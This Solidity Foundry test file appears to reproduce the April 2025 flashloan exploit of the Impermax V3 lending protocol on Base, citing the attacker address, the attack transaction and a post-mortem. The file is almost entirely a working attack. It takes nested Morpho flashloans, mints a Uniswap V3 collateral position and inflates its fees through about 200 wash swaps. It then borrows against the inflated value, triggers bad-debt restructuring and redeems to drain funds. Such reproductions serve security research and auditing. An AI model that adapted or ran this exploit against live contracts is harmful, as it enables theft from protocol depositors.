// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~300k
// 26th April, 2025, at 10:43 UTC
// Attacker : https://basescan.org/address/0xe3223f7e3343c2c8079f261d59ee1e513086c7c3
// Attack Contract : https://basescan.org/address/0x98e938899902217465f17cf0b76d12b3dca8ce1b
// Vulnerable Contract : https://basescan.org/address/0x5d93f216f17c225a8b5ffa34e74b7133436281ee
// Attack Tx : https://basescan.org/tx/0xde903046b5cdf27a5391b771f41e645e9cc670b649f7b87b1524fc4076f45983
// block: 29437439

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x5d93f216f17c225a8b5ffa34e74b7133436281ee#code
// https://medium.com/@quillaudits/how-impermax-v3-lost-300k-in-a-flashloan-attack-35b02d0cf152

address constant ImpermaxV3Borrowable = 0x5d93f216f17c225a8B5fFA34e74B7133436281eE;
address constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant WETH_address = 0x4200000000000000000000000000000000000006;
address constant USDC_address = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant ImpermaxV3Collateral = 0xc1D49fa32d150B31C4a5bf1Cbf23Cf7Ac99eaF7d;

address constant TokenizedUniswapV3Position = 0xa68F6075ae62eBD514d1600cb5035fa0E2210ef8;
address constant UniV3pool_200 = 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608;
address constant UniV3pool_500 = 0xd0b53D9277642d899DF5C87A3966A349A798F224;


contract ImpermaxV3_exp is Test {
    uint256 public borrowUSDC_amount = 22539727986604;
    uint256 public borrowWETH_amount = 10544813644832897955984;

    function setUp() public {
        vm.createSelectFork("base", 29437439 - 1);
        IFS(WETH_address).approve(Morpho, 10544813644832897955984);
    }

    function testExploit() public {
        IFS(Morpho).flashLoan(WETH_address, borrowWETH_amount, abi.encodePacked(uint256(1)));
        console2.log("WETH balance: ", IFS(WETH_address).balanceOf(address(this)));
        console2.log("USDC balance: ", IFS(USDC_address).balanceOf(address(this)));
    }

    bool private inFlashLoan;
    function onMorphoFlashLoan(uint256, bytes memory) external {
        if (!inFlashLoan) {
            // after borrowing WETH, we continue to borrow USDC.
            inFlashLoan = true;
            IFS(USDC_address).approve(Morpho, borrowUSDC_amount);
            IFS(Morpho).flashLoan(USDC_address, borrowUSDC_amount, abi.encodePacked(uint256(1)));
        }else{
            // following this USDC swap, the uniswapV3 will invoke uniswapV3SwapCallback to transfer USDC.
            uint160 falsesqrtPriceLimitX96 = 1461446703485210103287273052203988822378723970341;
            Uni_Pair_V3(UniV3pool_200).swap(
                address(this),
                false,
                1000000000,
                falsesqrtPriceLimitX96,
                abi.encodePacked(uint256(1))
            );

            IFS(UniV3pool_200).mint(TokenizedUniswapV3Position, -196216, -102028, 3315194000212825, abi.encodePacked(uint256(1)));
            uint256 newtoken_id = ITokenizedUniswapV3Position(TokenizedUniswapV3Position).mint(address(this), 200, -196216, -102028);
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).transferFrom(address(this), ImpermaxV3Collateral, newtoken_id);
            IimpermaxV3Collateral(ImpermaxV3Collateral).mint(address(this), newtoken_id);

            // start to swap to get fee from pool's transaction.
            uint160 truesqrtPriceLimitX96 = 4295128740;
            Uni_Pair_V3(UniV3pool_200).swap(
                address(this),
                true,
                -400000000000,
                truesqrtPriceLimitX96,
                abi.encodePacked(uint256(1))
            );
            Uni_Pair_V3(UniV3pool_200).swap(
                address(this),
                false,
                400080026003,
                falsesqrtPriceLimitX96,
                abi.encodePacked(uint256(1))
            );

            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).reinvest(newtoken_id, address(this));

            // // go on to swap for 50 times
            int256 trueamountSpecified = -19400000000000;
            int256 falseamountSpecified = 19403880776155;
            for (uint256 i = 0; i < 100; i++) {
                Uni_Pair_V3(UniV3pool_200).swap(
                    address(this),
                    true,
                    trueamountSpecified,
                    truesqrtPriceLimitX96,
                    abi.encodePacked(uint256(1))
                );
                Uni_Pair_V3(UniV3pool_200).swap(
                    address(this),
                    false,
                    falseamountSpecified,
                    falsesqrtPriceLimitX96,
                    abi.encodePacked(uint256(1))
                );
            }

            // one more time swap for 100000.
            Uni_Pair_V3(UniV3pool_200).swap(
                address(this),
                false,
                100000,
                falsesqrtPriceLimitX96,
                abi.encodePacked(uint256(1))
            );

            uint256 safetyMarginSqrt = 1183215960000000000;
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).getPositionData(newtoken_id, safetyMarginSqrt);

            uint256 wad = 166988030575033714385;
            IFS(WETH_address).transfer(ImpermaxV3Borrowable, wad);
            
            IFS(ImpermaxV3Borrowable).mint(address(this));
            uint256 borrowAmount = IFS(WETH_address).balanceOf(ImpermaxV3Borrowable);
            IFS(ImpermaxV3Borrowable).borrow(255, address(this), borrowAmount, "");
            
            // line 2439
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).reinvest(newtoken_id, address(this));
            IimpermaxV3Collateral(ImpermaxV3Collateral).restructureBadDebt(255);
            uint256 currentBorrowBalance = IFS(ImpermaxV3Borrowable).currentBorrowBalance(newtoken_id);

            IFS(WETH_address).transfer(ImpermaxV3Borrowable, currentBorrowBalance);
            IFS(ImpermaxV3Borrowable).borrow(newtoken_id, address(this), 0, "");
            IimpermaxV3Collateral(ImpermaxV3Collateral).redeem(address(this), newtoken_id, 1000000000000000000);
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).redeem(address(this), newtoken_id);

            // line 2553
            Uni_Pair_V3(UniV3pool_200).swap(
                address(this),
                true,
                14260200223938238,
                truesqrtPriceLimitX96,
                abi.encodePacked(uint256(1))
            );

            // uint256 _exchangeRate = IFS(ImpermaxV3Borrowable).exchangeRate();
            uint256 temp_amount = 120924566533707506470;
            IFS(ImpermaxV3Borrowable).transfer(ImpermaxV3Borrowable, temp_amount);
            uint256 redeemAmount = IFS(ImpermaxV3Borrowable).redeem(address(this));
            console2.log("redeemAmount: ", redeemAmount);
            // line 2581
            Uni_Pair_V3(UniV3pool_500).swap(
                address(this),
                true,
                -19760825,
                truesqrtPriceLimitX96,
                abi.encodePacked(uint256(1))
            );
            console2.log("Current USDC balance: ", IFS(USDC_address).balanceOf(address(this)));
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external {
        require(
            msg.sender == UniV3pool_200 || msg.sender == UniV3pool_500,
            "Invalid pool caller"
        );

        if (amount0Delta > 0) {
            IFS(WETH_address).transfer(msg.sender, uint256(amount0Delta));
        } else {
            IFS(USDC_address).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    function uniswapV3MintCallback(
        uint256 amount0,
        uint256 amount1,
        bytes calldata
    ) external {
        IFS(WETH_address).transfer(UniV3pool_200, amount0);
        IFS(USDC_address).transfer(UniV3pool_200, amount1);
    }
}

interface IFS is IERC20 {
    // function in Morpho
    function flashLoan(
        address token, 
        uint256 assets,
        bytes calldata data
    ) external;

    // function in 0x1c45_UniswapV3Pool
    function mint(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount,
        bytes calldata data
    ) external returns (uint256 amount0, uint256 amount1);

    
    // function in ImpermaxV3Borrowable
    function totalBorrows() external view returns (uint);
    function debtCeiling() external view returns (uint256);
    function mint(address minter) external returns (uint mintTokens);
    function borrow(uint256 tokenId, address receiver, uint borrowAmount, bytes calldata data) external;
    function currentBorrowBalance(uint tokenId) external returns (uint);
    function exchangeRate() external returns (uint);
    function redeem(address redeemer) external returns (uint redeemAmount);
}

interface IimpermaxV3Collateral {
    // function in ImpermaxV3Collateral
    function restructureBadDebt(uint tokenId) external;
    function redeem(address to, uint256 tokenId, uint256 percentage) external returns (uint redeemTokenId);
    function mint(address to, uint256 tokenId) external;
}

interface INFTLP {
	struct RealXY {
		uint256 realX;
		uint256 realY;
	}
	
	struct RealXYs {
		RealXY lowestPrice;
		RealXY currentPrice;
		RealXY highestPrice;
	}
}

interface ITokenizedUniswapV3Position {
    function getPool(uint24 fee) external view returns (address pool);
    function mint(address to, uint24 fee, int24 tickLower, int24 tickUpper) external  returns (uint256 newTokenId);
    function reinvest(uint256 tokenId, address bountyTo) external returns (uint256 bounty0, uint256 bounty1);
    function ownerOf(uint256 _tokenId) external view returns (address);
	function getApproved(uint256 tokenId) external view returns (address operator);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    	function getPositionData(uint256 _tokenId, uint256 _safetyMarginSqrt) external returns (
		uint256 priceSqrtX96,
		INFTLP.RealXYs memory realXYs
	);
    function redeem(address to, uint256 tokenId) external  returns (uint256 amount0, uint256 amount1);
}
